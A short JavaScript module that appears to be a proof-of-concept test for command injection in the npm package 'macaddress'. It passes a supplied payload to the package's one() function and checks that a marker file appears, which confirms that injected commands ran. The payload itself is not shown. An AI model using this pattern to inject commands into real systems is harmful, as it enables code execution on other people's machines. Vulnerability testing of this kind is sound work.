function exploitFunction(payload) {
  const fs = require("fs");
  const path = "./macaddress";
  
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log("File removed:", path);
    }
  } catch (err) {
    console.error(err);
  }

  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);

  require("macaddress").one(payload, function (err, mac) {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {
      // Handle the callback or async operation completion
    });
  });
}

module.exports = { exploitFunction };